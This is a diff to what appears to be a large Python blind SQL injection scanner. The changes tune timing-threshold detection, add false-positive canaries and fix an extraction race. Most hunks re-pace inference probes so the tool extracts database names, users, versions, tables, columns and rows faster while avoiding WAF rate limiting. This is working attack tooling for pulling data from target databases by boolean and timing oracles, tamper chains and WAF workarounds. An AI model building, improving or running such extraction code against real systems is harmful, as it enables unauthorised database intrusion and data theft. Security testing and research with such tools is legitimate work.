@@ -43402,6 +43402,16 @@ async def detect_stacked(engine,config,method,url,data,data_fmt,
                     _existing_cc = float(getattr(config, '_pcv_timing_threshold', 0) or 0)
                     if _sk_thresh_cc > _existing_cc:
                         config._pcv_timing_threshold = _sk_thresh_cc
+                    # BUG-8-FIX: also update per-DBMS map (WAF-phase path sets both; this path
+                    # was only setting the global scalar → Check B per-DBMS lookup found no entry
+                    # and fell through to a stale global from a different DBMS).
+                    _ts_map_cc = getattr(config, '_pcv_timing_threshold_map', None) or {}
+                    _dbms_key_cc = (getattr(config, '_detected_dbms', None) or
+                                    getattr(config, 'forced_dbms', None) or '').upper()
+                    _existing_cc_map = _ts_map_cc.get(_dbms_key_cc, 0) or 0
+                    if not _existing_cc_map or _sk_thresh_cc > _existing_cc_map:
+                        _ts_map_cc[_dbms_key_cc] = _sk_thresh_cc
+                        config._pcv_timing_threshold_map = _ts_map_cc
             except Exception:
                 pass
             return DetectionResult(param=param, technique='S', payload=str(p),
@@ -43489,6 +43499,22 @@ async def detect_stacked(engine,config,method,url,data,data_fmt,
                         if not _validate_response(_dna_s_fp, func_name="waf_block_check"): continue
                         if not _dna_s_fp or WAFBlockDiscriminator.is_waf_block(_dna_s_fp): continue
                         if _dna_s_fp.elapsed_ms >= _dna_s_expected:
+                            # BUG-6-FIX: Send a clean canary (no injection) and suppress
+                            # detection if the baseline is also slow — rules out CDN jitter
+                            # and transient server latency, matching the DBMS-specific path.
+                            _dna_s_canary = await _send_injected(
+                                engine, method, url, data, data_fmt, param, original, tamper_chain)
+                            if _validate_response(_dna_s_canary, func_name="dna_stacked_canary", allow_empty=True):
+                                if not (_get_safe_status_code(_dna_s_canary) == 0
+                                        and getattr(_dna_s_canary, "elapsed_ms", 0) == 0):
+                                    _dna_s_bl_mean = baseline.get("mean_timing", 300)
+                                    _dna_s_bl_std  = max(baseline.get("std_timing", 50), 50)
+                                    _dna_s_jitter  = _dna_s_bl_mean * 1.5 + _dna_s_bl_std * 2.0
+                                    if _dna_s_canary.elapsed_ms >= _dna_s_jitter:
+                                        LOG.debug("[Stacked-DNA] FP suppressed: canary slow "
+                                                  f"({_dna_s_canary.elapsed_ms:.0f}ms >= "
+                                                  f"{_dna_s_jitter:.0f}ms)")
+                                        continue
                             _dna_s_det = DetectionResult(
                                 param=param, technique='S',
                                 payload=_dna_s_pay, dbms=_dna_s_d,
@@ -43500,7 +43526,16 @@ async def detect_stacked(engine,config,method,url,data,data_fmt,
                             except Exception:
                                 pass
                             LOG.info(f"[Stacked-DNA] DETECTED via DNA shuffle ({_dna_s_d}/{_dna_s_lbl})")
-                            return _dna_s_det
+                            # BUG-7-FIX: Use _start_extraction_safely() to atomically claim the
+                            # extraction slot — prevents TOCTOU race when two surfaces simultaneously
+                            # confirm timing injection via DNA shuffle. Mirrors DBMS-specific path.
+                            if not _EXTRACTION_ACTIVE[0]:
+                                await _start_extraction_safely()
+                                return _dna_s_det
+                            else:
+                                LOG.debug("[Stacked-DNA] Extraction already active on another surface "
+                                          "— returning None to avoid duplicate PCV (Req 5)")
+                                return None
                 except Exception as _dna_s_inner:
                     LOG.debug(f"[Stacked-DNA] inner error: {_dna_s_inner}")
                     continue
@@ -59097,7 +59132,7 @@ class Scanner:
                     if r is None: break
                     if r: lo = mid + 1
                     else: hi = mid
-                    await asyncio.sleep(_delay)
+                    await asyncio.sleep(max(0.05, max(30.0, ms_false) / 1000.0 * 0.3))  # BUG-INFERENCE-HEX-SLEEP-PERF FIX: was asyncio.sleep(_delay) — _delay is SQL sleep time not network RTT; boolean hex-scan inter-step pacing must track ms_false
                 if lo < 48: break
                 ch = chr(lo)
                 if (ch or "").lower() not in "0123456789abcdef": break
@@ -59636,7 +59671,7 @@ class Scanner:
                 if _nb_cond is None:
                     _none_bits_still_none.append(_nb_mask)
                     continue
-                await asyncio.sleep(_delay * 0.5)
+                await asyncio.sleep(max(0.05, max(30.0, ms_false) / 1000.0 * 0.5))  # BUG-BITWISE-BIT-RETRY-SLEEP-PERF FIX: was _delay*0.5 (SQL sleep, not RTT)
                 _nb_r = await _waf_aware_eval(_nb_cond)  # bypass cache for fresh probe
                 if _nb_r is None:
                     _none_bits_still_none.append(_nb_mask)  # still ambiguous
@@ -59912,7 +59947,7 @@ class Scanner:
                 # None (network blip) and False (bit unset) both keep the bit at 0.
                 if r is True:
                     _val |= _mask
-                await asyncio.sleep(_delay * 0.5)
+                await asyncio.sleep(max(0.05, max(30.0, ms_false) / 1000.0 * 0.3))  # BUG-GETLEN-BITWISE-SLEEP-PERF FIX: was _delay*0.5 (SQL sleep time, not RTT)
 
             # BUG-BITWISE-LEN-WAF-RECOVERY FIX: Recover WAF-blocked hex-'8' bits using
             # equality probes (= operator). For each blocked mask, probe whether the
@@ -59948,7 +59983,7 @@ class Scanner:
                         _val = _cand
                         _len_eq_found = True
                         break
-                    await asyncio.sleep(_delay * 0.3)
+                    await asyncio.sleep(max(0.05, max(30.0, ms_false) / 1000.0 * 0.3))  # BUG-GETLEN-BITWISE-EQ-SLEEP-PERF FIX: was _delay*0.3
                 if not _len_eq_found and _candidates:
                     # No equality probe matched — oracle ambiguous; return raw partial value
                     # (conservative, possibly underestimated) or -1 if raw value is 0.
@@ -60287,7 +60322,9 @@ class Scanner:
                     # rapid burst — worsening the rate-limit condition that caused the Nones.
                     # Apply the same inter-probe delay used for False responses so the oracle
                     # has time to recover between probes.
-                    await asyncio.sleep(_delay * 0.3)
+                    # BUG-EXTRACT-CHAR-EQ-SLEEP-PERF FIX: was _delay*0.3 (_delay = SQL sleep time,
+                    # not RTT). Boolean oracle pacing should track ms_false (calibrated FALSE RTT).
+                    await asyncio.sleep(max(0.05, max(30.0, ms_false) / 1000.0 * 0.3))
                     continue
                 if r:
                     # FIX-EQCHAR-CONFIRM: Confirm by testing the NEXT candidate returns False/None.
@@ -60305,9 +60342,9 @@ class Scanner:
                     if _r_cc is not True:
                         return ch  # Confirmed genuine: neighbour returned False or None
                     # Both returned True → oracle biased; continue to next candidate
-                    await asyncio.sleep(_delay * 0.3)
+                    await asyncio.sleep(max(0.05, max(30.0, ms_false) / 1000.0 * 0.3))  # BUG-EXTRACT-CHAR-EQ-SLEEP-PERF FIX
                     continue
-                await asyncio.sleep(_delay * 0.3)
+                await asyncio.sleep(max(0.05, max(30.0, ms_false) / 1000.0 * 0.3))  # BUG-EXTRACT-CHAR-EQ-SLEEP-PERF FIX
             # BUG-EQUALITY-LATIN1 FIX: _FREQ_CHARS only covers printable ASCII (32-126).
             # _LATIN1_FREQ holds integer code points for common extended Latin-1 characters
             # (é=233, ü=252, ö=246, ä=228, ñ=241, ç=231, etc.) but they were never tried
@@ -60331,11 +60368,11 @@ class Scanner:
                     # same pattern: bare `continue` with no delay on None returns.  90+ Latin-1
                     # probes fire as a burst when the oracle is rate-limited, compounding the
                     # rate-limit pressure that caused the Nones in the first place.
-                    await asyncio.sleep(_delay * 0.3)
+                    await asyncio.sleep(max(0.05, max(30.0, ms_false) / 1000.0 * 0.3))  # BUG-EXTRACT-CHAR-EQ-SLEEP-PERF FIX
                     continue
                 if r:
                     return _ch_ext
-                await asyncio.sleep(_delay * 0.3)
+                await asyncio.sleep(max(0.05, max(30.0, ms_false) / 1000.0 * 0.3))  # BUG-EXTRACT-CHAR-EQ-SLEEP-PERF FIX
             return None
 
         async def _get_length_equality(query, max_len=64):
@@ -60414,9 +60451,9 @@ class Scanner:
                     if _confirmed:
                         return _try_len
                     # Cross-check failed: skip this length and keep searching
-                    await asyncio.sleep(_delay * 0.3)
+                    await asyncio.sleep(max(0.05, max(30.0, ms_false) / 1000.0 * 0.3))  # BUG-GETLEN-EQ-SLEEP-PERF FIX: was _delay*0.3
                     continue
-                await asyncio.sleep(_delay * 0.3)
+                await asyncio.sleep(max(0.05, max(30.0, ms_false) / 1000.0 * 0.3))  # BUG-GETLEN-EQ-SLEEP-PERF FIX: was _delay*0.3
             return -1
 
         async def _extract_string_equality(query, label="", max_len=64):
@@ -60650,7 +60687,8 @@ class Scanner:
                     # previous bare `continue` fired all 180+ probes as a rapid burst — worsening
                     # the rate-limit that caused the Nones.  Apply the same inter-probe delay used
                     # for False responses so the oracle has time to recover between probes.
-                    await asyncio.sleep(_delay * 0.3)
+                    # BUG-EXTRACT-CHAR-SUB-SLEEP-PERF FIX: was _delay*0.3 (SQL sleep, not RTT).
+                    await asyncio.sleep(max(0.05, max(30.0, ms_false) / 1000.0 * 0.3))
                     continue
                 if r:
                     # FIX-SUBCHAR-CONFIRM: Confirm by testing the NEXT ASCII value returns False.
@@ -60661,9 +60699,9 @@ class Scanner:
                     if _r_sc is not True:
                         return chr(ascii_val)  # Confirmed genuine
                     # Both True → oracle biased; continue
-                    await asyncio.sleep(_delay * 0.3)
+                    await asyncio.sleep(max(0.05, max(30.0, ms_false) / 1000.0 * 0.3))  # BUG-EXTRACT-CHAR-SUB-SLEEP-PERF FIX
                     continue
-                await asyncio.sleep(_delay * 0.3)
+                await asyncio.sleep(max(0.05, max(30.0, ms_false) / 1000.0 * 0.3))  # BUG-EXTRACT-CHAR-SUB-SLEEP-PERF FIX
             return None
 
         async def _extract_string_subtraction(query, label="", max_len=64):
@@ -60728,9 +60766,9 @@ class Scanner:
                     if _sub_confirmed:
                         _length = _try_len
                         break
-                    await asyncio.sleep(_delay * 0.3)
+                    await asyncio.sleep(max(0.05, max(30.0, ms_false) / 1000.0 * 0.3))  # BUG-SUBSTR-LEN-SLEEP-PERF FIX: was _delay*0.3
                     continue
-                await asyncio.sleep(_delay * 0.3)
+                await asyncio.sleep(max(0.05, max(30.0, ms_false) / 1000.0 * 0.3))  # BUG-SUBSTR-LEN-SLEEP-PERF FIX: was _delay*0.3
             if _length == 0:
                 LOG.info("[Inference] %s: subtraction length=0 (empty or WAF blocked)", label)
                 return ""
@@ -60764,11 +60802,21 @@ class Scanner:
 
         async def _smart_sleep(was_true):
             """Variable delay based on last response type.
-            Longer delays help avoid WAF rate limiting."""
+            Longer delays help avoid WAF rate limiting.
+            BUG-SMART-SLEEP-PERF FIX: _delay is SQL sleep time (e.g. 10s), not network RTT.
+            With _delay=10s: True→15s, False→10s between EVERY bisection step.
+            For 20 bisection steps × 48 chars, this adds ~12,000s of unnecessary sleep.
+            Fix: use ms_false/1000 (calibrated FALSE RTT, e.g. 0.442s) as the pacing base.
+            Multiply by a slightly higher factor for boolean-oracle paths where server load
+            is light; preserve a minimum 0.05s floor to avoid hammering on fast networks.
+            Note: for timing-oracle paths, the HTTP response already includes the full SQL sleep
+            duration — no additional sleep is needed to space probes. For boolean-oracle, use
+            1× RTT (was_true) / 0.5× RTT (was_false) since True responses include SQL overhead."""
+            _s_rtt = max(30.0, ms_false) / 1000.0  # calibrated FALSE response RTT in seconds
             if was_true:
-                await asyncio.sleep(_delay * 1.5)  # Server just did heavy work + WAF recovery
+                await asyncio.sleep(max(0.05, _s_rtt * 1.0))  # BUG-SMART-SLEEP-PERF FIX: was _delay*1.5
             else:
-                await asyncio.sleep(_delay * 1.0)  # Standard delay even for fast responses
+                await asyncio.sleep(max(0.05, _s_rtt * 0.5))  # BUG-SMART-SLEEP-PERF FIX: was _delay*1.0
 
 
 
@@ -60789,7 +60837,7 @@ class Scanner:
             # a valid boolean oracle was active — completely breaking extraction on
             # those targets.  Only apply the ms<30 retry+reject for timing oracles.
             if fp is None or (not _boolean_oracle and ms < 30):
-                await asyncio.sleep(_delay * 2)
+                await asyncio.sleep(max(0.5, max(30.0, ms_false) / 1000.0 * 2.0))  # BUG-EVAL-RETRY-SLEEP-PERF FIX: was _delay*2 (SQL sleep, not RTT)
                 fp, ms = await _send_payload(cond)
             if fp is None or (not _boolean_oracle and ms < 30):
                 return None
@@ -61041,20 +61089,27 @@ class Scanner:
                 if ms1 >= max(_thresh, _ms_false_est_inv * 0.90):
                     return False  # clearly in slow/False range for inverted oracle
 
-            await asyncio.sleep(_delay)
+            # BUG-EVAL-CONFIRM-SLEEP-PERF FIX: For boolean oracle, _delay (SQL sleep time,
+            # e.g. 10s) between confirmation probes adds 10-20s per bit position.
+            # Boolean oracle responses don't require full SQL sleep time to differ —
+            # they differ in body/status immediately. Use RTT-based pacing (ms_false/1000)
+            # for boolean oracle; keep _delay for timing oracle (CDN avoidance).
+            _ec_sleep = (max(0.05, max(30.0, ms_false) / 1000.0 * 0.5)
+                         if _boolean_oracle else _delay)
+            await asyncio.sleep(_ec_sleep)
             r2 = await _eval(cond)
             if r2 is None:
                 return r1  # Trust first result
             if r1 == r2:
                 return r1  # Consistent
             # Disagreement  third vote
-            await asyncio.sleep(_delay)
+            await asyncio.sleep(_ec_sleep)
             r3 = await _eval(cond)
             return r3 if r3 is not None else r1
 
-        #  Run probes that depend on _eval (defined above) 
+        #  Run probes that depend on _eval (defined above)
         _dbms_confirmed = await _confirm_dbms()
-        await asyncio.sleep(_delay)
+        await asyncio.sleep(max(0.05, max(30.0, ms_false) / 1000.0 * 0.3))  # BUG-ORACLE-SETUP-SLEEP-PERF FIX: was _delay
         await _probe_error_oracle()
         if _error_oracle and not _boolean_oracle:
             _boolean_oracle = True
@@ -61064,7 +61119,7 @@ class Scanner:
         # _dbms_confirmed=False, but _confirm_dbms() now short-circuits based on
         # calibration margin without actually testing the > operator.  If we skip
         # probing, the scanner assumes > works, WAF blocks it, and extraction fails.
-        await asyncio.sleep(_delay)
+        await asyncio.sleep(max(0.05, max(30.0, ms_false) / 1000.0 * 0.3))  # BUG-ORACLE-SETUP-SLEEP-PERF FIX: was _delay
         await _probe_operator_alternatives()
 
         # BUG-V62-INFERENCE-NO-EXTRACT-CALL FIX (CRITICAL, Req 7/16):
@@ -61285,7 +61340,7 @@ class Scanner:
                                         _lr = await _cached_eval(_lq_str)
                                         if _lr is None: break
                                         if _lr is True: _found_lc = _lch; break
-                                        await asyncio.sleep(_delay * 0.05)
+                                        await asyncio.sleep(max(0.05, max(30.0, ms_false) / 1000.0 * 0.1))  # BUG-LIKE-SLEEP-PERF FIX: was _delay*0.05 (SQL sleep time, not RTT); boolean LIKE-scan pacing must track ms_false
                                     if _found_lc is None: break
                                     _like_result += _found_lc
                                     LOG.info("[Inference-like] pos=%d char=%r result=%r", _lpos, _found_lc, _like_result)
@@ -61374,7 +61429,7 @@ class Scanner:
             # all return None on fast servers (<30ms), breaking all character extraction.
             # Only retry/reject on missing fp; for boolean oracle any valid fp is fine.
             if fp is None or (not _boolean_oracle and ms < 30):
-                await asyncio.sleep(_delay * 3)
+                await asyncio.sleep(max(1.0, max(30.0, ms_false) / 1000.0 * 3.0))  # BUG-WAFEVAL-RETRY-SLEEP-PERF FIX: was _delay*3; use RTT-based retry with 1s minimum
                 fp, ms = await _send_payload(cond)
             if fp is None or (not _boolean_oracle and ms < 30):
                 return None
@@ -61849,7 +61904,7 @@ class Scanner:
                     lo = mid + 1
                 else:
                     hi = mid
-                await asyncio.sleep(_delay)
+                await asyncio.sleep(max(0.05, max(30.0, ms_false) / 1000.0 * 0.3))  # BUG-GETLEN-SLEEP-PERF FIX: was _delay (SQL sleep time, not RTT); boolean bisection pacing should track ms_false
             return lo
 
         async def _extract_string(query, label="", max_len=128,
@@ -62382,7 +62437,7 @@ class Scanner:
                     if _r is None:
                         return None  # oracle dead
                     _bits.append(1 if _r else 0)
-                    await asyncio.sleep(_delay)
+                    await asyncio.sleep(max(0.05, max(30.0, ms_false) / 1000.0 * 0.3))  # BUG-FALLBACK-BITSHIFT-SLEEP-PERF FIX: was asyncio.sleep(_delay) — _delay is SQL sleep time not network RTT; use ms_false/1000*0.3 for inter-bit pacing
                 # Reconstruct value: _bits[0] = highest bit, _bits[-1] = bit 0
                 _val = sum(_bits[i] << (_fbs_n_bits - 1 - i) for i in range(_fbs_n_bits))
                 # BUG-FALLBACK-BITSHIFT-UNICODE-HI FIX: was `32 <= _val <= 255` — same
@@ -62494,6 +62549,20 @@ class Scanner:
                 #      oracle is genuinely unresponsive \u2192 return None (oracle dead).
                 _fe_ambiguous = []   # candidates that returned None (potentially True)
                 _fe_none_streak = 0  # consecutive None counter (oracle-dead detection)
+                # BUG-FALLBACK-EQ-SLEEP-PERF FIX (CRITICAL):
+                # _delay is the SQL sleep duration (e.g. 10s for pg_sleep(10)) \u2014 it is
+                # the TIME the server spends sleeping, not a network latency measure.
+                # Using _delay * 0.5 / _delay * 0.3 as inter-probe pacing produced:
+                #   _delay=10s \u2192 5.0s sleep between None probes, 3.0s between False probes.
+                # For a 48-char DB name with ~100 candidates/position: ~(5+3)\u00d7100\u00d748 \u2248
+                # 38,400s cumulative sleep \u2014 far beyond the 600s extraction timeout.
+                # The equality scan uses a BOOLEAN oracle (status/body diff), not timing,
+                # so inter-probe delay should track network RTT (ms_false = FALSE response
+                # latency from calibration) \u2014 not the SQL sleep value.
+                # Fix: use ms_false/1000 \u00d7 factor (same factors, different base).
+                # Safe floor 0.05s (false-probe) / 0.1s (retry) so we don't hammer
+                # the target on fast networks; safe fallback if ms_false=0 (200ms).
+                _fe_rtt_s = max(30.0, ms_false) / 1000.0  # calibrated FALSE RTT in seconds
                 for _val in _order:
                     _cond = f"({_ae})={_val}"
                     _r = await _eval_confirm(_cond)
@@ -62507,13 +62576,13 @@ class Scanner:
                             LOG.warning("[Inference] %s: _fallback_equality oracle dead "
                                         "(30 consecutive None at pos=%d), aborting.", label, p)
                             return None
-                        await asyncio.sleep(_delay * 0.5)
+                        await asyncio.sleep(max(0.05, _fe_rtt_s * 0.5))  # BUG-FALLBACK-EQ-SLEEP-PERF FIX: was _delay * 0.5
                         continue
                     _fe_none_streak = 0  # reset streak on any concrete answer
                     if _r:
                         LOG.info("[Inference] pos=%d equality \u2192 %r (val=%d)", p, chr(_val), _val)
                         return chr(_val)
-                    await asyncio.sleep(_delay * 0.3)
+                    await asyncio.sleep(max(0.05, _fe_rtt_s * 0.3))  # BUG-FALLBACK-EQ-SLEEP-PERF FIX: was _delay * 0.3
                 # --- Post-scan ambiguity resolution ---
                 if len(_fe_ambiguous) == 1:
                     # Exactly one candidate was ambiguous and all others returned False.
@@ -62534,7 +62603,7 @@ class Scanner:
                             _r_retry = await _eval(_cond)
                             if _r_retry is not None:
                                 break
-                            await asyncio.sleep(_delay)
+                            await asyncio.sleep(max(0.1, _fe_rtt_s * 0.5))  # BUG-FALLBACK-EQ-SLEEP-PERF FIX: was _delay
                         if _r_retry is True:
                             LOG.info("[Inference] pos=%d equality (ambiguous-retry) \u2192 %r "
                                      "(val=%d)", p, chr(_val), _val)
@@ -62638,11 +62707,15 @@ class Scanner:
                         if _r is not None:
                             break
                         if _mb_retry < 2:
-                            await asyncio.sleep(_delay * (2 ** _mb_retry))
+                            # BUG-FALLBACK-MODBIT-SLEEP-PERF FIX: _delay is SQL sleep time
+                            # (e.g. 10s), not network RTT. Back-off base should track RTT
+                            # (ms_false/1000). Use same _fe_rtt_s as _fallback_equality.
+                            _mb_rtt_s = max(30.0, ms_false) / 1000.0
+                            await asyncio.sleep(_mb_rtt_s * (2 ** _mb_retry))
                     if _r is None:
                         return None  # oracle dead / WAF blocked MOD operator too (3 attempts)
                     _bits.append(1 if _r else 0)
-                    await asyncio.sleep(_delay)
+                    await asyncio.sleep(max(0.05, max(30.0, ms_false) / 1000.0 * 0.3))  # BUG-FALLBACK-MODBIT-SLEEP-PERF FIX: was _delay
                 _val = sum(_bits[i] << (_n_bits - 1 - i) for i in range(_n_bits))
                 if 32 <= _val <= _char_hi:
                     LOG.info("[Inference] pos=%d modbit → %r (val=%d)", p, chr(_val), _val)
@@ -63059,10 +63132,10 @@ class Scanner:
                     if _consecutive_fails >= 3:
                         LOG.warning("[Inference] %s: %d consecutive failures, stopping", label, _consecutive_fails)
                         break
-                    await asyncio.sleep(_delay * 2)
+                    await asyncio.sleep(max(0.1, max(30.0, ms_false) / 1000.0 * 2.0))  # BUG-EXTRACT-STRING-FAIL-SLEEP-PERF FIX: was _delay*2
                     continue
                 _consecutive_fails = 0
-                await asyncio.sleep(_delay)
+                await asyncio.sleep(max(0.05, max(30.0, ms_false) / 1000.0 * 0.3))  # BUG-EXTRACT-STRING-CHAR-SLEEP-PERF FIX: was _delay; boolean oracle pacing should track ms_false not SQL sleep time
 
                 # FIX-BISECT-126: Extend bisection to full Latin-1 range [32, 255].
                 # Old range [32, 126] silently produces chr(126)='~' for any char
@@ -63164,7 +63237,7 @@ class Scanner:
 
                     if _bisect_result is None:
                         # Failed  retry with backoff
-                        await asyncio.sleep(_delay * 2)
+                        await asyncio.sleep(max(0.1, max(30.0, ms_false) / 1000.0 * 2.0))  # BUG-BISECT-RETRY-SLEEP-PERF FIX: was _delay*2
                         _bisect_result = await _cached_eval(cond)
                     if _bisect_result is None:
                         _consecutive_fails += 1
@@ -63410,7 +63483,7 @@ class Scanner:
                         "SAP_HANA":        "(1e0 IS NULL)",
                     }.get(_dbms, "1e0 IS NULL")
                     _san_t = await _waf_aware_eval(_defer_san_true_cond)
-                    await asyncio.sleep(_delay * 0.5)
+                    await asyncio.sleep(max(0.05, max(30.0, ms_false) / 1000.0 * 0.5))  # BUG-DEFERRED-SAN-SLEEP-PERF FIX: was _delay*0.5
                     _san_f = await _waf_aware_eval(_defer_san_false_cond)
                     # BUG-ORACLE-SANITY-IS-CHECK FIX: `is True`/`is False` only matches Python
                     # singleton booleans. Comparison operators (ms >= _thresh, _sim_gap > 0)
@@ -63591,7 +63664,7 @@ class Scanner:
                         LOG.info("[Inference]  EQUALITY %s = %s", _l, _r)
                 except Exception as _e:
                     LOG.info("[Inference] EQUALITY %s: %s", _l, _e)
-                await asyncio.sleep(_delay)
+                await asyncio.sleep(max(0.05, max(30.0, ms_false) / 1000.0 * 0.3))  # BUG-WAF-FALLBACK-METH-SLEEP-PERF FIX: was _delay
             if _ext and _valid_ext(_ext):
                 _save_ext(_ext)
                 return True
@@ -63610,7 +63683,7 @@ class Scanner:
                             LOG.info("[Inference]  SUBTRACTION %s = %s", _l, _r)
                     except Exception as _e:
                         LOG.info("[Inference] SUBTRACTION %s: %s", _l, _e)
-                    await asyncio.sleep(_delay)
+                    await asyncio.sleep(max(0.05, max(30.0, ms_false) / 1000.0 * 0.3))  # BUG-WAF-FALLBACK-METH-SLEEP-PERF FIX: was _delay
                 if _ext and _valid_ext(_ext):
                     _save_ext(_ext)
                     return True
@@ -63629,7 +63702,7 @@ class Scanner:
                             LOG.info("[Inference]  BITWISE %s = %s", _l, _r)
                     except Exception as _e:
                         LOG.info("[Inference] BITWISE %s: %s", _l, _e)
-                    await asyncio.sleep(_delay)
+                    await asyncio.sleep(max(0.05, max(30.0, ms_false) / 1000.0 * 0.3))  # BUG-WAF-FALLBACK-METH-SLEEP-PERF FIX: was _delay
                 if _ext and _valid_ext(_ext):
                     _save_ext(_ext)
                     return True
@@ -63708,9 +63781,9 @@ class Scanner:
                         if r2 is None: return -1
                         if r2: lo = mid + 1
                         else: hi = mid
-                        await asyncio.sleep(_delay * 0.5)
+                        await asyncio.sleep(max(0.05, max(30.0, ms_false) / 1000.0 * 0.3))  # BUG-GETLEN-FAST-SLEEP-PERF FIX: was _delay*0.5
                     return lo
-                await asyncio.sleep(_delay * 0.5)
+                await asyncio.sleep(max(0.05, max(30.0, ms_false) / 1000.0 * 0.3))  # BUG-GETLEN-FAST-SLEEP-PERF FIX: was _delay*0.5
             return await _get_length(query, max_len)
 
         # BUG-7-MAIN-EXTRACT-RETRY FIX (CRITICAL): The extraction block at ~57446 ran
@@ -63915,7 +63988,7 @@ class Scanner:
                         LOG.info("[Inference] %s: predicted %r from %r  (saved %d reqs)",
                                  label, _p, partial, (len(_p) - len(partial)) * 6)
                         return _p
-                    await asyncio.sleep(_delay * 0.5)
+                    await asyncio.sleep(max(0.05, max(30.0, ms_false) / 1000.0 * 0.5))  # BUG-PREDICTION-SLEEP-PERF FIX: was _delay*0.5
             return None
 
         async def _smart_extract(query, label="", max_len=128,
@@ -64085,10 +64158,10 @@ class Scanner:
                     lo = mid + 1
                 else:
                     hi = mid
-                await asyncio.sleep(_delay)
+                await asyncio.sleep(max(0.05, max(30.0, ms_false) / 1000.0 * 0.3))  # BUG-ROWCOUNT-SLEEP-PERF FIX: was _delay
             return lo
 
-        #  Extract data 
+        #  Extract data
         _data = self.session.data
 
         _DB_QUERY = {
@@ -64202,7 +64275,7 @@ class Scanner:
             _has = await _cached_eval(_null_cond)
             if not _has:
                 return (pos, None)
-            await asyncio.sleep(_delay * 0.3)
+            await asyncio.sleep(max(0.05, max(30.0, ms_false) / 1000.0 * 0.3))  # BUG-EXTRACT-CHAR-AT-SLEEP-PERF FIX: was _delay*0.3
             # Bisect
             # BUG-EXTRACT-CHAR-AT-126-FIX: was hi=126 — chars 127-255 (Latin-1 supplement:
             # é,ü,ö,ä,ç,ñ,etc.) converged at 126 and returned '~' silently.
@@ -64255,7 +64328,7 @@ class Scanner:
                     return (pos, None)
                 if r: lo = mid + 1
                 else: hi = mid
-                await asyncio.sleep(_delay)
+                await asyncio.sleep(max(0.05, max(30.0, ms_false) / 1000.0 * 0.3))  # BUG-EXTRACT-CHAR-AT-BISECT-SLEEP-PERF FIX: was _delay
             if 32 <= lo <= _eca_char_hi:
                 # BUG-EXTRACT-CHAR-AT-126-FIX part 2: was `if lo >= 32` which did not
                 # guard against lo > 255 (now guarded using DBMS-specific ceiling above).
@@ -64536,13 +64609,13 @@ class Scanner:
                                     break
                                 _cols.append(_cn_j)
                                 LOG.info("[Inference]   Column %d: %s (user_tab fallback)", _j+1, _cn_j)
-                                await asyncio.sleep(_delay)
+                                await asyncio.sleep(max(0.05, max(30.0, ms_false) / 1000.0 * 0.3))  # BUG-COL-ENUM-SLEEP-PERF FIX: was _delay
                             break  # outer loop: all columns fetched via fallback; stop here
                     if not _cn:
                         break
                 _cols.append(_cn)
                 LOG.info("[Inference]   Column %d: %s", i+1, _cn)
-                await asyncio.sleep(_delay)
+                await asyncio.sleep(max(0.05, max(30.0, ms_false) / 1000.0 * 0.3))  # BUG-COL-ENUM-SLEEP-PERF FIX: was _delay
 
             return _cols
 
@@ -64747,7 +64820,7 @@ class Scanner:
                 if not _tn: break
                 _tables.append(_tn)
                 LOG.info("[Inference]   Table %d: %s", i+1, _tn)
-                await asyncio.sleep(_delay)
+                await asyncio.sleep(max(0.05, max(30.0, ms_false) / 1000.0 * 0.3))  # BUG-TABLE-ENUM-SLEEP-PERF FIX: was _delay
             return _tables
 
         #  ENHANCEMENT: Real-time output 
@@ -64820,7 +64893,7 @@ class Scanner:
                             LOG.info("[Inference] %s[%d] corrected: %r%r", label, i+1, result[i], _pr[1])
                             _fixed[i] = _pr[1]
                             _corrections += 1
-                        await asyncio.sleep(_delay * 0.3)
+                        await asyncio.sleep(max(0.05, max(30.0, ms_false) / 1000.0 * 0.3))  # BUG-REEXTRACT-CHAR-SLEEP-PERF FIX: was _delay*0.3
                     # If >70% of chars changed, the oracle is inconsistent (garbage both times)
                     if _corrections > len(result) * 0.7:
                         LOG.warning("[Inference] %s: %d/%d chars changed on re-extract  oracle inconsistent, discarding",
@@ -64855,7 +64928,7 @@ class Scanner:
         if not _db and not _user:
             if _use_error:
                 _db = await _error_extract(_db_q, _err_tpl, "database")
-                await asyncio.sleep(_delay)
+                await asyncio.sleep(max(0.05, max(30.0, ms_false) / 1000.0 * 0.3))  # BUG-EXTRACT-BOUNDARY-SLEEP-PERF FIX: was _delay
                 _user = await _error_extract(_user_q, _err_tpl, "user")
             else:
                 _multi = await _extract_multi(
@@ -64874,7 +64947,7 @@ class Scanner:
         # User
         if not _user:
             _user_q = _USER_QUERY.get(_dbms, "SELECT current_user")
-            await asyncio.sleep(_delay)
+            await asyncio.sleep(max(0.05, max(30.0, ms_false) / 1000.0 * 0.3))  # BUG-EXTRACT-BOUNDARY-SLEEP-PERF FIX: was _delay
             _user = await _verified_extract(_user_q, "user", 64)
         if _user:
             _data["current_user"] = _user
@@ -64885,7 +64958,7 @@ class Scanner:
 
         # Version (shorter  often long, cap at 40 chars)
         _ver_q = _VER_QUERY.get(_dbms, "SELECT version()")
-        await asyncio.sleep(_delay)
+        await asyncio.sleep(max(0.05, max(30.0, ms_false) / 1000.0 * 0.3))  # BUG-EXTRACT-BOUNDARY-SLEEP-PERF FIX: was _delay
         _ver = await _extract_string(_ver_q, "version", 40)
         if _ver:
             _data["banner"] = _ver
@@ -64940,7 +65013,7 @@ class Scanner:
                     if _exists:
                         _found_cols.append(_cn)
                         LOG.info("[Inference]    %s.%s exists", _tbl, _cn)
-                    await asyncio.sleep(_delay * 0.5)
+                    await asyncio.sleep(max(0.05, max(30.0, ms_false) / 1000.0 * 0.3))  # BUG-COL-EXISTS-SLEEP-PERF FIX: was _delay*0.5
                 if not _found_cols:
                     _found_cols = _cols_to_try[:5]
 
@@ -64973,7 +65046,7 @@ class Scanner:
                              _cn, _clo, _chi, _ctype)
 
                 for _row in range(_max_rows):
-                    await asyncio.sleep(_delay)
+                    await asyncio.sleep(max(0.05, max(30.0, ms_false) / 1000.0 * 0.3))  # BUG-ROW-DUMP-SLEEP-PERF FIX: was _delay
                     # BUG-INFERENCE-DUMP-UNQUOTED-IDENTIFIERS FIX: Every branch below
                     # previously used bare {_cn} and {_tbl} without DBMS-specific
                     # identifier quoting.  Reserved-word column names (MySQL: `key`,
@@ -66116,6 +66189,17 @@ class Scanner:
         _cm = _re.search(r'\s*(?:--\s*-?|-#|#)\s*$', _payload)
         _suffix = _cm.group(0) if _cm else "-- -"
         _before_suffix = _payload[:_payload.rfind(_suffix)].rstrip() if _suffix in _payload else _payload
+
+        # BUG-DIRECT-HQ-DELAY-HOISTED FIX: _delay was defined at line ~66375 (after the nested
+        # _send_d_timed closure), but is referenced in the HQ template-building block below
